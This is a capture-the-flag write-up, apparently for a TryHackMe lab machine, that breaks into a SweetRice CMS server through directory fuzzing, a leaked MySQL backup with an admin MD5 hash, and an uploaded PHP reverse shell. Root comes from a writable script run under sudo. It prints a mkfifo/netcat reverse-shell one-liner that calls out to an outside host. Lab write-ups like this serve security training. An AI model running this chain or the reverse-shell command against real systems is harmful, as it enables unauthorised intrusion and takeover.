Starting with the machine enumeration

```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -Pn -A 10.10.236.241                                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 10:02 EDT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 26.00% done; ETC: 10:03 (0:00:26 remaining)
Nmap scan report for 10.10.236.241
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.12 seconds
```

SSH and HTTP ports are open. So SSH is useless until we find any key or password.
So, I will be going with HTTP.

I logged on to the website, and it was a normal Apache page. Then, I used Ffuf to find the sub-directories
```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.236.241/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.236.241/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 634ms]
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 2789ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4811ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6808ms]
content                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 185ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 177ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 170ms]
:: Progress: [4614/4614] :: Job [1/1] :: 213 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

I have started using Ffuf over Gobuster as it is faster.

Finding the `content` sub-directory, I logged on to that and found. 

![Screenshot 2024-06-23 193534](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/6267ed93-e3f0-461b-a8a4-540b81140ea2)

SweetRice Content Management System. Again, a subdirectory search is done inside the content directory.

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.236.241/content/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.236.241/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 213ms]
                        [Status: 200, Size: 2199, Words: 109, Lines: 36, Duration: 221ms]
_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 383ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3907ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3908ms]
as                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 187ms]
attachment              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 180ms]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 171ms]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 168ms]
index.php               [Status: 200, Size: 2199, Words: 109, Lines: 36, Duration: 186ms]
js                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 184ms]
:: Progress: [4614/4614] :: Job [1/1] :: 231 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```
Here, we see many subdirectories. I logged on to every subdirectory and checked if anything was useful. 2 were useful - `as` and `inc`.
![Screenshot 2024-06-23 193839](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/6abfc3b7-28e9-4706-ac5a-0140c230e29e)

And I forgot to take a pic for the 'inc' subdirectory. It contains some more subdirectories. There is a directory named mysql in it, which has the following
![Screenshot 2024-06-23 193825](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/5a06cb35-423f-4cdd-8c65-bed05e4f0254)

So, I downloaded the mysql_backup file and ran it on my terminal, founding the following

```
...
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
...
```
A username and a hashed password in MD5 (I initially tried base64, which was stupidity as it is nowhere close to the base64 format).

With the login credentials, I could log in as the admin on the CMS.

![Screenshot 2024-06-23 194106](https://github.com/satyamraj17/HTB-THM-Writeups/assets/139890312/ed78951a-7727-4c29-9d9e-12bd6cb520bf)

I then searched Metasploit for exploits for SweetRice.

```
msf6 > searchsploit sweet rice
[*] exec: searchsploit sweet rice

----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                              | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                           | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                            | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                              | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                  | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                         | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                    | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                | php/webapps/14184.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
What caught my eye was the first path of the path, `php`. 

I browsed the CMS admin page, and in the Dashboard, I saw an option `Website Status: Close`. I turned it on to see what happened, but there was nothing much.

There was an `Ads` section in the left column. I checked that, and I can upload code for ads. So, I uploaded a **php reverese shell** code in there and opened a netcat listener on my terminal

Went to the inc section, ran the file and I got the reverse shell.
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.236.241 42522
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 17:15:29 up 15 min,  0 users,  load average: 0.20, 0.44, 0.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
Stabilised the shell and started looking for the flags.

Now is the time for privilege escalation.

The first thing to check is `sudo -l` to see if I can run any command with root access.
```
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$
```
I can run a `Perl` file with root access without a password. I checked the `backup.pl` file.
```
www-data@THM-Chal:/$ cat /home/itguy/backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
And the `copy.sh` file.
```
www-data@THM-Chal:/$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
The copy.sh files start a shell session (the /bin/sh part) and the other stuff. So I thought I would get the root shell if I ran the file with `sudo`.

But I didn't get the root shell directly. Also, I have read, write, and access to the copy.sh file.
```
www-data@THM-Chal:/$ ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```
So, I replaced the file's content with `/bin/bash`. This command runs the bash shell.
```
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl 
root@THM-Chal:/# 
```
I got the root shell. Next for the root flag.
